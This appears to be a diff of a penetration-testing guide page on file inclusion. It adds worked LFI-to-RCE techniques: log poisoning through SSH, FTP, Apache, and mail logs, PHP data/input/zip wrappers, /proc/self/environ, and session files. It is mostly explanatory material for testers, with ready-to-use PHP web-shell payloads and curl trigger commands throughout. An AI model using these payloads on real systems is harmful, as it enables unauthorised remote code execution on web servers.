@@ -10,13 +10,13 @@ LFI/RFI \(Local/Remote File Inclusion\) attacks allow attackers to read sensitiv
 
 ## Practice
 
-Testers need to identify input vectors \(parts of the app that accept content from the users\) that could be used for file related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.
+Testers need to identify input vectors \(parts of the app that accept content from the users\) that could be used for file-related operations. For each identified vector, testers need to check if malicious strings and values successfully exploit any vulnerability.
 
-* **Local File Inclusion** : inclusion of a local file \(in the web server directory\) using an absolute path
-* **LFI + directory traversal** : inclusion of a local file \(in the web server directory or not\) by "climbing" the server tree with `../` \(relative path\)
-* **Remote File Inclusion** : inclusion of a remote file \(not on the server\) using an URI
+* **Local File Inclusion**: inclusion of a local file \(in the webserver directory\) using an absolute path
+* **LFI + directory traversal**: inclusion of a local file \(in the webserver directory or not\) by "climbing" the server tree with `../` \(relative path\)
+* **Remote File Inclusion**: inclusion of a remote file \(not on the server\) using a URI
 
-The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) \(Perl\) can help finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.
+The tool [dotdotpwn](https://github.com/wireghoul/dotdotpwn) \(Perl\) can help in finding and exploiting directory traversal vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient.
 
 ```bash
 # With a request file where /?argument=TRAVERSAL (request file must be in /usr/share/dotdotpwn)
@@ -26,7 +26,7 @@ dotdotpwn.pl -m payload -h $RHOST -x $RPORT -p $REQUESTFILE -k "root:" -f /etc/p
 dotdotpwn -m stdout -d 5
 ```
 
-The tool [kadimus](https://github.com/P0cL4bs/Kadimus) \(C\) can help finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.
+The tool [kadimus](https://github.com/P0cL4bs/Kadimus) \(C\) can help in finding and exploiting File Inclusion vulnerabilities. However, manual testing is usually more efficient.
 
 ```bash
 kadimus --user-agent "PENTEST" -u '$URL/?parameter=value'
@@ -41,58 +41,198 @@ Local file inclusions can sometimes be combined with other vulnerabilities to ac
 * unrestricted file upload
 * log poisoning
 
-### 🛠️ LFI to RCE \(via logs poisoning\)
+### LFI to RCE \(via logs poisoning\)
 
-For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.
+{% hint style="warning" %}
+Log files may be stored in different locations depending on the operating system/distribution.
+{% endhint %}
+
+#### /var/log/auth.log
+
+For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in `/var/log/auth.log`. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.
 
 ```bash
+# Sending the payload via SSH
 ssh '<?php phpinfo(); ?>'@$TARGET
+
+# Accessing the log file via LFI
 curl --user-agent "PENTEST" $URL/?parameter=/var/log/auth.log&cmd=id
 ```
 
-🛠️ Introduce other examples, like apache session logs
+#### /var/log/vsftpd.log
 
-* /var/log/apache/access.log
-* /var/log/apache/error.log
-* /var/log/httpd-access.log
-* /var/log/vsftpd.log
-* /var/log/sshd.log
-* /var/log/mail
+When the FTP service is available, testers can try to access the `/var/log/vsftpd.log` and see if any content is displayed. If that's the case, log poisoning may be possible by connecting via FTP and sending a payload \(depending on which web technology is used\).
+
+```bash
+# Sending the payload via FTP
+ftp $TARGET_IP
+> '<?php system($_GET['cmd'])?>'
+
+# Accessing the log file via LFI
+curl --user-agent "PENTEST" $URL/?parameter=/var/log/vsftpd.log&cmd=id
+```
+
+#### var/log/apache2/access.log
+
+When the web application is using an Apache 2 server, the `access.log` may be accessible using an LFI.
+
+* **About `access.log`**: records all requests processed by the server.
+* **About netcat**: using netcat avoids URL encoding.
+
+```bash
+# Sending the payload via netcat
+nc $TARGET_IP $TARGET_PORT
+> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+> Host: $TARGET_IP
+> Connection: close
+
+# Accessing the log file via LFI
+curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
+```
+
+{% hint style="info" %}
+There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `access.log` path and file depending on the operating system/distribution:
+
+> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – **/var/log/httpd/access\_log**
+> * Debian / Ubuntu Linux Apache access log file location – **/var/log/apache2/access.log**
+> * FreeBSD Apache access log file location – **/var/log/httpd-access.log**
+{% endhint %}
+
+#### /var/log/apache/error.log
+
+This one is similar to the `access.log`, but instead of putting simple requests in the log file, it will put errors in `error.log`.
+
+* **About `error.log`**: records any errors encountered in processing requests.
+* **About netcat**: using netcat avoids URL encoding.
+
+```bash
+# Sending the payload via netcat
+nc $TARGET_IP $TARGET_PORT
+> GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+> Host: $TARGET_IP
+> Connection: close
+
+# Accessing the log file via LFI
+curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
+```
+
+{% hint style="info" %}
+There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `error.log` path and file depending on the operating system/distribution:
+
+> * RHEL / Red Hat / CentOS / Fedora Linux Apache error file location – **/var/log/httpd/error\_log**
+> * Debian / Ubuntu Linux Apache error log file location – **/var/log/apache2/error.log**
+> * FreeBSD Apache error log file location – **/var/log/httpd-error.log**
+{% endhint %}
+
+#### **/var/log/mail.log**
+
+When an SMTP server is running and writing logs in `/var/log/mail.log`, it's possible to inject a payload using telnet \(as an example\).
+
+```bash
+# Sending the payload via telnet
+telnet $TARGET_IP $TARGET_PORT
+> MAIL FROM:<pentest@pentest.com>
+> RCPT TO:<?php system($_GET['cmd']); ?>
+
+# Accessing the log file via LFI
+curl --user-agent "PENTEST" $URL/?parameter=/var/log/mail.log&cmd=id
+```
 
 ### 🛠️ LFI to RCE \(via phpinfo\)
 
 ### 🛠️ LFI to RCE \(via file upload\)
 
-### 🛠️ LFI to RCE \(via php wrappers\)
+### LFI to RCE \(via php wrappers\)
 
-//note : not sure we can achieve RCE with wrapper, we can however leak local file content \(i.e. source code\)
+#### Data wrapper
 
-* php://file
-* php://filter
-* php://input
-* expect://
-* data://text/plain;base64,command
+```bash
+# Shell in base64 encoding
+echo '<?php system($_GET['cmd']); ?>' | base64
+
+# Accessing the log file via LFI
+curl --user-agent "PENTEST" $URL/?parameter=data://text/plain;base64,$SHELL_BASE64&cmd=id
+```
+
+{% hint style="warning" %}
+The attribute `allow_url_include` should be set.   
+This configuration can be checked in the `php.ini` file.
+{% endhint %}
+
+#### Input wrapper
+
+```bash
+# Testers should make sure to change the $URL
+curl -s -X POST --data "<?php system('id'); ?>" "$URL?parameter=php://input"
+```
+
+{% hint style="warning" %}
+The attribute `allow_url_include` should be set.   
+This configuration can be checked in the `php.ini` file.
+{% endhint %}
+
+#### Zip wrapper
+
+{% hint style="info" %}
+The prerequisite for this method is to be able to [upload a file](https://app.gitbook.com/@shutdown/s/the-hacker-recipes/~/drafts/-Mk6VflWDxyIbsU_ZjzA/web-services/attacks-on-inputs/unrestricted-file-upload).
+{% endhint %}
+
+```bash
+echo '<?php system($_GET['cmd']); ?>' > payload.php
+zip payload.zip payload.php
+
+# Accessing the log file via LFI (the # identifier is URL-encoded)
+curl --user-agent "PENTEST" $URL/?parameter=zip://payload.zip%23payload.php&cmd=id
+```
+
+#### 🛠️ Phar wrapper
 
 ### 🛠️ LFI to RCE \(via /proc\)
 
-* /proc/self/environ
-* /proc/self/fd
+#### /proc/self/environ
 
-### 🛠️ LFI to RCE \(via php session\)
+Testers can abuse a process created due to a request. The payload is injected in the `User-Agent` header.
 
-🛠️ Introduce php wrappers
+```bash
+# Sending a request to $URL with a malicious user-agent
+# Accessing the payload via LFI
+curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
 
-PHP wrappers can be combined with a [file upload](unrestricted-file-upload.md) to achieve RCE.
+```
 
-1. Upload a `.zip` file containing a PHP code execution script \(`rce.php`\)
-2. Trigger the code execution by requesting `http://some.website/?page=zip://path/to/file.zip%23rce.php`.
+#### 🛠️ /proc/\*/fd
+
+### 🛠️ LFI to RCE \(via PHP session\)
+
+When a web server wants to handle sessions, it can use PHP session cookies \(PHPSESSID\).
+
+#### Reconnaissance
+
+1. Finding where the sessions are stored.
+
+   Examples:
+
+   * `/var/lib/php5/sess_[PHPSESSID]`
+   * `/var/lib/php/sessions/sess_[PHPSESSID]`
+
+2. Displaying a PHPSESSID to see if any parameter is reflected inside.
+
+   Example:
+
+   * The user name for the session \(from a parameter called `user`\)
+
+#### RCE
+
+```bash
+login=1&user=<?php system("id");?>&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_$PHPSESSID
+```
 
 ### RFI to RCE
 
-The tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the phpinfo in the response.
+The tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the `phpinfo` in the response.
 
 {% hint style="warning" %}
-If the the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
+If the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
 {% endhint %}
 
 ```bash
